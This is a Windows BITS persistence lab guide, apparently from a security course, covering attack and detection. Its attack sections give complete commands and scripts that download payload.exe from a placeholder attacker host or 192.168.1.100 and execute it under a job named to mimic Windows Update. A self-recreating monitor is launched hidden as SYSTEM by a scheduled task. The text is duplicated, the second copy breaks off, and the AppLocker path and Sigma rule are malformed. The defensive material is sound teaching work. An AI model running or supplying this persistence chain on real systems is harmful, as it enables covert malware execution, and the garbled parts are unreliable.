Windows BITS Persistence Lab
Table of Contents
Introduction
Understanding BITS and Its Capabilities
Creating a Malicious BITS Job
Implementing a Persistence Mechanism
Detecting and Preventing Malicious BITS Jobs
Conclusion
Appendix: PowerShell Scripts
1. Introduction
Overview of BITS
Background Intelligent Transfer Service (BITS) is a Windows component that facilitates asynchronous, prioritized, and throttled transfer of files between machines using idle network bandwidth. Originally designed for Windows Update, BITS is now used by various Microsoft and third-party applications.
How Attackers Abuse BITS for Persistence
Attackers leverage BITS for several reasons:
Stealth: BITS operates in the background and appears as legitimate Windows traffic
Persistence: BITS jobs can survive reboots and resume automatically
Bypass: Many security tools do not monitor BITS activity closely
Flexibility: BITS supports download, upload, and callback execution upon completion
MITRE ATT&CK Mapping
Tablolar
Technique ID	Name	Description
T1197	BITS Jobs	Adversaries may abuse BITS to download, execute, and clean up after running malicious code
T1105	Ingress Tool Transfer	BITS can be used to transfer tools into a compromised environment
2. Understanding BITS and Its Capabilities
How BITS Functions in Windows
BITS operates through a client-server architecture:
plain
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  BITS Client    │────▶│  BITS Service   │────▶│  Remote Server  │
│  (bitsadmin)    │     │  (qmgr.dll)     │     │  (HTTP/HTTPS)   │
└─────────────────┘     └─────────────────┘     └─────────────────┘
Key Features:
Asynchronous Transfers: Jobs run in the background without user intervention
Bandwidth Throttling: Uses only idle bandwidth to avoid detection
Resume Capability: Interrupted transfers resume from where they left off
Priority Levels: Background, Foreground, High, Normal, Low
Notification Events: Can trigger actions upon completion (e.g., execute a file)
Why Attackers Prefer BITS for Covert Operations
Tablolar
Advantage	Explanation
Trusted Process	BITS is a legitimate Windows service (svchost.exe)
Network Stealth	Traffic blends with Windows Update and other legitimate BITS traffic
No User Prompt	Runs silently without user interaction
Survives Reboots	Jobs persist across system restarts
Built-in Tool	No need to download additional tools
BITS Job States
plain
CREATED ──▶ QUEUED ──▶ CONNECTING ──▶ TRANSFERRING ──▶ TRANSFERRED ──▶ ACKNOWLEDGED
                │                                              │
                └───────────────── SUSPENDED ◀─────────────────┘
3. Creating a Malicious BITS Job
Step-by-Step Guide
⚠️ WARNING: This section is for educational purposes only. Perform only on authorized lab environments.
Step 1: Enumerate Existing BITS Jobs
powershell
# List all BITS jobs
Get-BitsTransfer -AllUsers

# Using BITSAdmin (deprecated but still available)
bitsadmin /list /allusers

# Detailed information
Get-BitsTransfer | Select-Object DisplayName, JobState, BytesTransferred, BytesTotal
Step 2: Create a New BITS Job
powershell
# Using PowerShell (Recommended)
$job = Start-BitsTransfer -Source "http://attacker-server/payload.exe" `
                          -Destination "C:\temp\payload.exe" `
                          -DisplayName "WindowsUpdate" `
                          -Asynchronous

# Using BITSAdmin (Legacy)
bitsadmin /create "WindowsUpdate"
bitsadmin /addfile "WindowsUpdate" "http://attacker-server/payload.exe" "C:\temp\payload.exe"
Step 3: Configure Callback Execution
powershell
# Set command to execute after download completes
bitsadmin /setnotifycmdline "WindowsUpdate" "C:\temp\payload.exe" ""

# Set minimum retry delay
bitsadmin /setminretrydelay "WindowsUpdate" 60

# Resume the job
bitsadmin /resume "WindowsUpdate"
Step 4: Verify Job Status
powershell
# Check job progress
bitsadmin /info "WindowsUpdate" /verbose

# Or using PowerShell
Get-BitsTransfer -Name "WindowsUpdate" | Format-List *
Step 5: Complete and Clean Up
powershell
# Complete the job
bitsadmin /complete "WindowsUpdate"

# Remove the job
bitsadmin /reset
Full Attack Chain Example
powershell
# Attacker creates BITS job for persistence
$jobName = "SystemUpdate"
$payloadURL = "http://192.168.1.100/payload.exe"
$localPath = "C:\Users\Public\Documents\update.exe"

# Create job
bitsadmin /create $jobName

# Add file to download
bitsadmin /addfile $jobName $payloadURL $localPath

# Configure execution on completion
bitsadmin /setnotifycmdline $jobName $localPath ""

# Set retry policy for persistence
bitsadmin /setminretrydelay $jobName 30
bitsadmin /setnoprogresstimeout $jobName 120

# Resume job
bitsadmin /resume $jobName

# Verify
bitsadmin /info $jobName
4. Implementing a Persistence Mechanism
PowerShell Checker Script
The checker script monitors BITS jobs and recreates them if removed.
powershell
<#
.SYNOPSIS
    BITS Job Persistence Monitor
.DESCRIPTION
    Monitors for the existence of a specific BITS job and recreates it if removed.
    Designed for authorized red team exercises and security research.
.NOTES
    Author: Security Research Lab
    Date: 2026-07-23
    Use: Educational purposes only
#>

# Configuration
$jobName = "SystemUpdate"
$payloadURL = "http://192.168.1.100/payload.exe"
$localPath = "C:\Users\Public\Documents\update.exe"
$logFile = "C:\temp\bits_monitor.log"

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $logFile -Append
    Write-Host "$timestamp - $Message"
}

function Test-BITSJob {
    param([string]$Name)
    $job = Get-BitsTransfer -Name $Name -ErrorAction SilentlyContinue
    return ($job -ne $null)
}

function New-MaliciousBITSJob {
    param(
        [string]$Name,
        [string]$Source,
        [string]$Destination
    )

    Write-Log "Creating BITS job: $Name"

    try {
        # Remove existing job if present
        Get-BitsTransfer -Name $Name -ErrorAction SilentlyContinue | Remove-BitsTransfer

        # Create new job
        $job = Start-BitsTransfer -Source $Source `
                                  -Destination $Destination `
                                  -DisplayName $Name `
                                  -Asynchronous `
                                  -Priority Normal

        Write-Log "BITS job created successfully"
        return $true
    }
    catch {
        Write-Log "ERROR: Failed to create BITS job - $($_.Exception.Message)"
        return $false
    }
}

# Main monitoring loop
Write-Log "BITS Monitor started"

while ($true) {
    if (-not (Test-BITSJob -Name $jobName)) {
        Write-Log "BITS job not found. Recreating..."
        New-MaliciousBITSJob -Name $jobName -Source $payloadURL -Destination $localPath
    }
    else {
        Write-Log "BITS job exists. Monitoring..."
    }

    # Check every 60 seconds
    Start-Sleep -Seconds 60
}
Automating with Scheduled Tasks
powershell
# Create scheduled task to run checker script at startup
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
                                  -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\temp\bits_checker.ps1"

$trigger = New-ScheduledTaskTrigger -AtStartup

$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName "BITSMonitor" `
                       -Action $action `
                       -Trigger $trigger `
                       -Principal $principal `
                       -Settings $settings
5. Detecting and Preventing Malicious BITS Jobs
Identifying Suspicious BITS Jobs
PowerShell Detection Script
powershell
<#
.SYNOPSIS
    BITS Job Detection Script
.DESCRIPTION
    Scans for suspicious BITS jobs that may indicate persistence mechanisms.
#>

function Get-SuspiciousBITSJobs {
    $suspiciousPatterns = @(
        "*update*",
        "*system*", 
        "*windows*",
        "*temp*",
        "*public*"
    )

    $suspiciousExtensions = @(".exe", ".dll", ".ps1", ".bat", ".vbs")

    $allJobs = Get-BitsTransfer -AllUsers

    foreach ($job in $allJobs) {
        $isSuspicious = $false
        $reasons = @()

        # Check display name
        foreach ($pattern in $suspiciousPatterns) {
            if ($job.DisplayName -like $pattern) {
                $isSuspicious = $true
                $reasons += "Suspicious name pattern: $pattern"
            }
        }

        # Check destination path
        if ($job.FileList -match "(temp|public|appdata)") {
            $isSuspicious = $true
            $reasons += "Suspicious destination path"
        }

        # Check file extension
        foreach ($ext in $suspiciousExtensions) {
            if ($job.FileList -like "*$ext") {
                $isSuspicious = $true
                $reasons += "Executable file type: $ext"
            }
        }

        if ($isSuspicious) {
            [PSCustomObject]@{
                DisplayName = $job.DisplayName
                JobState = $job.JobState
                FileList = $job.FileList
                Owner = $job.OwnerIdentity
                Reasons = ($reasons -join "; ")
                RiskLevel = "HIGH"
            }
        }
    }
}

# Run detection
$suspicious = Get-SuspiciousBITSJobs
if ($suspicious) {
    Write-Host "`n[!] SUSPICIOUS BITS JOBS DETECTED!" -ForegroundColor Red
    $suspicious | Format-Table -AutoSize
} else {
    Write-Host "`n[+] No suspicious BITS jobs found." -ForegroundColor Green
}
Windows Event Logs
BITS activity is logged in several locations:
Tablolar
Event Log	Event ID	Description
Microsoft-Windows-Bits-Client/Operational	3	BITS started transfer
Microsoft-Windows-Bits-Client/Operational	4	BITS completed transfer
Microsoft-Windows-Bits-Client/Operational	59	BITS job created
Security	4688	Process creation (includes bitsadmin)
powershell
# Query BITS events
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Bits-Client/Operational'
    ID = 3, 4, 59
} | Select-Object TimeCreated, Id, LevelDisplayName, Message | Format-Table -Wrap

# Query process creation events for bitsadmin
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4688
} | Where-Object { $_.Message -match "bitsadmin" } | Select-Object TimeCreated, Message
Security Measures
1. Group Policy Restrictions
plain
Computer Configuration > Administrative Templates > Network > Background Intelligent Transfer Service (BITS)
- "Limit the maximum network bandwidth for BITS background transfers"
- "Do not allow the computer to act as a BITS peer"
2. AppLocker / Windows Defender Application Control
Block bitsadmin.exe for standard users:
powershell
# Create AppLocker rule (requires Enterprise edition)
New-AppLockerPolicy -RuleType Path -User Everyone -Action Deny -Path "%SYSTEMROOT%\System32itsadmin.exe"
3. Network Monitoring
Monitor for:
Unusual BITS traffic to external IPs
Large file transfers during off-hours
BITS jobs downloading executable files
4. Endpoint Detection Rules
yaml
# Sigma Rule for BITS Abuse
title: Suspicious BITS Activity
logsource:
    product: windows
    service: bits
 detection:
    selection:
        EventID:
            - 3
            - 4
        FileName|endswith:
            - '.exe'
            - '.dll'
            - '.ps1'
    condition: selection
level: high
6. Conclusion
Summary of the Attack Method
BITS persistence is a stealthy technique that leverages legitimate Windows functionality:
Creation: Attacker creates a BITS job with a deceptive name
Download: Job downloads payload from remote server
Execution: BITS notification mechanism executes the payload
Persistence: Job survives reboots and resumes automatically
Evasion: Traffic appears as legitimate Windows Update activity
Best Practices for Defense and Mitigation
Tablolar
Layer	Control	Implementation
Prevent	Restrict BITSAdmin access	AppLocker, GPO
Detect	Monitor BITS events	SIEM rules, Event Log monitoring
Respond	Automated job termination	SOAR playbooks
Recover	System restore	Regular backups, incident response
Key Takeaways
BITS is a legitimate service that can be abused for malicious purposes
Detection requires monitoring both BITS-specific logs and process creation events
Defense in depth is essential: combine network monitoring, endpoint detection, and policy restrictions
Regular security audits should include checks for unauthorized BITS jobs
Appendix: PowerShell Scripts
Complete BITS Enumeration Script
powershell
# bits_enumerate.ps1
# Enumerates all BITS jobs with detailed information

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "  BITS JOB ENUMERATION" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

$jobs = Get-BitsTransfer -AllUsers

if (-not $jobs) {
    Write-Host "[+] No BITS jobs found." -ForegroundColor Green
} else {
    foreach ($job in $jobs) {
        Write-Host "Job Name: $($job.DisplayName)" -ForegroundColor Yellow
        Write-Host "  State: $($job.JobState)"
        Write-Host "  Owner: $($job.OwnerIdentity)"
        Write-Host "  Files: $($job.FileList.RemoteName -join ', ')"
        Write-Host "  Destination: $($job.FileList.LocalName -join ', ')"
        Write-Host "  Bytes Transferred: $([math]::Round($job.BytesTransferred / 1MB, 2)) MB"
        Write-Host "  Creation Time: $($job.CreationTime)"
        Write-Host "  ---" -ForegroundColor DarkGray
    }
}
BITS Cleanup Script
powershell
# bits_cleanup.ps1
# Removes all non-system BITS jobs

$systemJobs = @("Windows Update", "Microsoft Defender")
$allJobs = Get-BitsTransfer -AllUsers

foreach ($job in $allJobs) {
    if ($job.DisplayName -notin $systemJobs) {
        Write-Host "Removing: $($job.DisplayName)" -ForegroundColor Yellow
        Remove-BitsTransfer -BitsJob $job -Confirm:$false
    }
}

Write-Host "`n[+] Cleanup complete." -ForegroundColor Green
Document created for educational purposes as part of Holberton School Cyber Security curriculum.
Last updated: 2026-07-23Windows BITS Persistence Lab
Table of Contents
Introduction
Understanding BITS and Its Capabilities
Creating a Malicious BITS Job
Implementing a Persistence Mechanism
Detecting and Preventing Malicious BITS Jobs
Conclusion
Appendix: PowerShell Scripts
1. Introduction
Overview of BITS
Background Intelligent Transfer Service (BITS) is a Windows component that facilitates asynchronous, prioritized, and throttled transfer of files between machines using idle network bandwidth. Originally designed for Windows Update, BITS is now used by various Microsoft and third-party applications.
How Attackers Abuse BITS for Persistence
Attackers leverage BITS for several reasons:
Stealth: BITS operates in the background and appears as legitimate Windows traffic
Persistence: BITS jobs can survive reboots and resume automatically
Bypass: Many security tools do not monitor BITS activity closely
Flexibility: BITS supports download, upload, and callback execution upon completion
MITRE ATT&CK Mapping
Tablolar
Technique ID	Name	Description
T1197	BITS Jobs	Adversaries may abuse BITS to download, execute, and clean up after running malicious code
T1105	Ingress Tool Transfer	BITS can be used to transfer tools into a compromised environment
2. Understanding BITS and Its Capabilities
How BITS Functions in Windows
BITS operates through a client-server architecture:
plain
┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐
│  BITS Client    │────▶│  BITS Service   │────▶│  Remote Server  │
│  (bitsadmin)    │     │  (qmgr.dll)     │     │  (HTTP/HTTPS)   │
└─────────────────┘     └─────────────────┘     └─────────────────┘
Key Features:
Asynchronous Transfers: Jobs run in the background without user intervention
Bandwidth Throttling: Uses only idle bandwidth to avoid detection
Resume Capability: Interrupted transfers resume from where they left off
Priority Levels: Background, Foreground, High, Normal, Low
Notification Events: Can trigger actions upon completion (e.g., execute a file)
Why Attackers Prefer BITS for Covert Operations
Tablolar
Advantage	Explanation
Trusted Process	BITS is a legitimate Windows service (svchost.exe)
Network Stealth	Traffic blends with Windows Update and other legitimate BITS traffic
No User Prompt	Runs silently without user interaction
Survives Reboots	Jobs persist across system restarts
Built-in Tool	No need to download additional tools
BITS Job States
plain
CREATED ──▶ QUEUED ──▶ CONNECTING ──▶ TRANSFERRING ──▶ TRANSFERRED ──▶ ACKNOWLEDGED
                │                                              │
                └───────────────── SUSPENDED ◀─────────────────┘
3. Creating a Malicious BITS Job
Step-by-Step Guide
⚠️ WARNING: This section is for educational purposes only. Perform only on authorized lab environments.
Step 1: Enumerate Existing BITS Jobs
powershell
# List all BITS jobs
Get-BitsTransfer -AllUsers

# Using BITSAdmin (deprecated but still available)
bitsadmin /list /allusers

# Detailed information
Get-BitsTransfer | Select-Object DisplayName, JobState, BytesTransferred, BytesTotal
Step 2: Create a New BITS Job
powershell
# Using PowerShell (Recommended)
$job = Start-BitsTransfer -Source "http://attacker-server/payload.exe" `
                          -Destination "C:\temp\payload.exe" `
                          -DisplayName "WindowsUpdate" `
                          -Asynchronous

# Using BITSAdmin (Legacy)
bitsadmin /create "WindowsUpdate"
bitsadmin /addfile "WindowsUpdate" "http://attacker-server/payload.exe" "C:\temp\payload.exe"
Step 3: Configure Callback Execution
powershell
# Set command to execute after download completes
bitsadmin /setnotifycmdline "WindowsUpdate" "C:\temp\payload.exe" ""

# Set minimum retry delay
bitsadmin /setminretrydelay "WindowsUpdate" 60

# Resume the job
bitsadmin /resume "WindowsUpdate"
Step 4: Verify Job Status
powershell
# Check job progress
bitsadmin /info "WindowsUpdate" /verbose

# Or using PowerShell
Get-BitsTransfer -Name "WindowsUpdate" | Format-List *
Step 5: Complete and Clean Up
powershell
# Complete the job
bitsadmin /complete "WindowsUpdate"

# Remove the job
bitsadmin /reset
Full Attack Chain Example
powershell
# Attacker creates BITS job for persistence
$jobName = "SystemUpdate"
$payloadURL = "http://192.168.1.100/payload.exe"
$localPath = "C:\Users\Public\Documents\update.exe"

# Create job
bitsadmin /create $jobName

# Add file to download
bitsadmin /addfile $jobName $payloadURL $localPath

# Configure execution on completion
bitsadmin /setnotifycmdline $jobName $localPath ""

# Set retry policy for persistence
bitsadmin /setminretrydelay $jobName 30
bitsadmin /setnoprogresstimeout $jobName 120

# Resume job
bitsadmin /resume $jobName

# Verify
bitsadmin /info $jobName
4. Implementing a Persistence Mechanism
PowerShell Checker Script
The checker script monitors BITS jobs and recreates them if removed.
powershell
<#
.SYNOPSIS
    BITS Job Persistence Monitor
.DESCRIPTION
    Monitors for the existence of a specific BITS job and recreates it if removed.
    Designed for authorized red team exercises and security research.
.NOTES
    Author: Security Research Lab
    Date: 2026-07-23
    Use: Educational purposes only
#>

# Configuration
$jobName = "SystemUpdate"
$payloadURL = "http://192.168.1.100/payload.exe"
$localPath = "C:\Users\Public\Documents\update.exe"
$logFile = "C:\temp\bits_monitor.log"

function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $logFile -Append
    Write-Host "$timestamp - $Message"
}

function Test-BITSJob {
    param([string]$Name)
    $job = Get-BitsTransfer -Name $Name -ErrorAction SilentlyContinue
    return ($job -ne $null)
}

function New-MaliciousBITSJob {
    param(
        [string]$Name,
        [string]$Source,
        [string]$Destination
    )

    Write-Log "Creating BITS job: $Name"

    try {
        # Remove existing job if present
        Get-BitsTransfer -Name $Name -ErrorAction SilentlyContinue | Remove-BitsTransfer

        # Create new job
        $job = Start-BitsTransfer -Source $Source `
                                  -Destination $Destination `
                                  -DisplayName $Name `
                                  -Asynchronous `
                                  -Priority Normal

        Write-Log "BITS job created successfully"
        return $true
    }
    catch {
        Write-Log "ERROR: Failed to create BITS job - $($_.Exception.Message)"
        return $false
    }
}

# Main monitoring loop
Write-Log "BITS Monitor started"

while ($true) {
    if (-not (Test-BITSJob -Name $jobName)) {
        Write-Log "BITS job not found. Recreating..."
        New-MaliciousBITSJob -Name $jobName -Source $payloadURL -Destination $localPath
    }
    else {
        Write-Log "BITS job exists. Monitoring..."
    }

    # Check every 60 seconds
    Start-Sleep -Seconds 60
}
Automating with Scheduled Tasks
powershell
# Create scheduled task to run checker script at startup
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
                                  -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File C:\temp\bits_checker.ps1"

$trigger = New-ScheduledTaskTrigger -AtStartup

$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

Register-ScheduledTask -TaskName "BITSMonitor" `
                       -Action $action `
                       -Trigger $trigger `
                       -Principal $principal `
                       -Settings $settings
5. Detecting and Preventing Malicious BITS Jobs
Identifying Suspicious BITS Jobs
PowerShell Detection Script
powershell
<#
.SYNOPSIS
    BITS Job Detection Script
.DESCRIPTION
    Scans for suspicious BITS jobs that may indicate persistence mechanisms.
#>

function Get-SuspiciousBITSJobs {
    $suspiciousPatterns = @(
        "*update*",
        "*system*", 
        "*windows*",
        "*temp*",
        "*public*"
    )

    $suspiciousExtensions = @(".exe", ".dll", ".ps1", ".bat", ".vbs")

    $allJobs = Get-BitsTransfer -AllUsers

    foreach ($job in $allJobs) {
        $isSuspicious = $false
        $reasons = @()

        # Check display name
        foreach ($pattern in $suspiciousPatterns) {
            if ($job.DisplayName -like $pattern) {
                $isSuspicious = $true
                $reasons += "Suspicious name pattern: $pattern"
            }
        }

        # Check destination path
        if ($job.FileList -match "(temp|public|appdata)") {
            $isSuspicious = $true
            $reasons += "Suspicious destination path"
        }

        # Check file extension
        foreach ($ext in $suspiciousExtensions) {
            if ($job.FileList -like "*$ext") {
                $isSuspicious = $true
                $reasons += "Executable file type: $ext"
            }
        }

        if ($isSuspicious) {
            [PSCustomObject]@{
                DisplayName = $job.DisplayName
                JobState = $job.JobState
                FileList = $job.FileList
                Owner = $job.OwnerIdentity
                Reasons = ($reasons -join "; ")
                RiskLevel = "HIGH"
            }
        }
    }
}

# Run detection
$suspicious = Get-SuspiciousBITSJobs
if ($suspicious) {
    Write-Host "`n[!] SUSPICIOUS BITS JOBS DETECTED!" -ForegroundColor Red
    $suspicious | Format-Table -AutoSize
} else {
    Write-Host "`n[+] No suspicious BITS jobs found." -ForegroundColor Green
}
Windows Event Logs
BITS activity is logged in several locations:
Tablolar
Event Log	Event ID	Description
Microsoft-Windows-Bits-Client/Operational	3	BITS started transfer
Microsoft-Windows-Bits-Client/Operational	4	BITS completed transfer
Microsoft-Windows-Bits-Client/Operational	59	BITS job created
Security	4688	Process creation (includes bitsadmin)
powershell
# Query BITS events
Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Bits-Client/Operational'
    ID = 3, 4, 59
} | Select-Object TimeCreated, Id, LevelDisplayName, Message | Format-Table -Wrap

# Query process creation events for bitsadmin
Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    ID = 4688
} | Where-Object { $_.Message -match "bitsadmin" } | Select-Object TimeCreated, Message
Security Measures
1. Group Policy Restrictions
plain
Computer Configuration > Administrative Templates > Network > Background Intelligent Transfer Service (BITS)
- "Limit the maximum network bandwidth for BITS background transfers"
- "Do not allow the computer to act as a BITS peer"
2. AppLocker / Windows Defender Application Control
Block bitsadmin.exe for standard users:
powershell
# Create AppLocker rule (requires Enterprise edition)
New-AppLockerPolicy -RuleType Path -User Everyone -Action Deny -Path "%SYSTEMROOT%\System32itsadmin.exe"
3. Network Monitoring
Monitor for:
Unusual BITS traffic to external IPs
Large file transfers during off-hours
BITS jobs downloading executable files
4. Endpoint Detection Rules
yaml
# Sigma Rule for BITS Abuse
title: Suspicious BITS Activity
logsource:
    product: windows
    service: bits
 detection:
    selection:
        EventID:
            - 3
            - 4
        FileName|endswith:
            - '.exe'
            - '.dll'
            - '.ps1'
    condition: selection
level: high
6. Conclusion
Summary of the Attack Method
BITS persistence is a stealthy technique that leverages legitimate Windows functionality:
Creation: Attacker creates a BITS job with a deceptive name
Download: Job downloads payload from remote server
Execution: BITS notification mechanism executes the payload
Persistence: Job survives reboots and resumes automatically
Evasion: Traffic appears as legitimate Windows Update activity
Best Practices for Defense and Mitigation
Tablolar
Layer	Control	Implementation
Prevent	Restrict BITSAdmin access	AppLocker, GPO
Detect	Monitor BITS events	SIEM rules, Event Log monitoring
Respond	Automated job termination	SOAR playbooks
Recover	System restore	Regular backups, incident response
Key Takeaways
BITS is a legitimate service that can be abused for malicious purposes
Detection requires monitoring both BITS-specific logs and process creation events
Defense in depth is essential: combine network monitoring, endpoint detection, and policy restrictions
Regular security audits should include checks for unauthorized BITS jobs
Appendix: PowerShell Scripts
Complete BITS Enumeration Script
powershell
# bits_enumerate.ps1
# Enumerates all BITS jobs with detailed information

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "  BITS JOB ENUMERATION" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

$jobs = Get-BitsTransfer -AllUsers

if (-not $jobs) {
    Write-Host "[+] No BITS jobs found." -ForegroundColor Green
} else {
    foreach ($job in $jobs) {
        Write-Host "Job Name: $($job.DisplayName)" -ForegroundColor Yellow
        Write-Host "  State: $($job.JobState)"
        Write-Host "  Owner: $($job.OwnerIdentity)"
        Write-Host "  Files: $($job.FileList.RemoteName -join ', ')"
        Write-Host "  Destination: $($job.FileList.LocalName -join ', ')"
        Write-Host "  Bytes Transferred: $([math]::Round($job.BytesTransferred / 1MB, 2)) MB"
        Write-Host "  Creation Time: $($job.CreationTime)"
        Write-Host "  ---" -ForegroundColor DarkGray
    }
}
BITS Cleanup Script
powershell
# bits_cleanup.ps1
# Removes all non-system BITS jobs

$systemJobs = @("Windows Update", "Microsoft Defender")
$allJobs = Get-BitsTransfer -AllUsers

foreach ($job in $allJobs) {
    if ($job.DisplayName -notin $systemJobs) {
        Write-Host "Removing: $($job.DisplayName)" -ForegroundColor Yellow
        Remove-BitsTransfer -BitsJob $job -Confirm:$false
    }
}

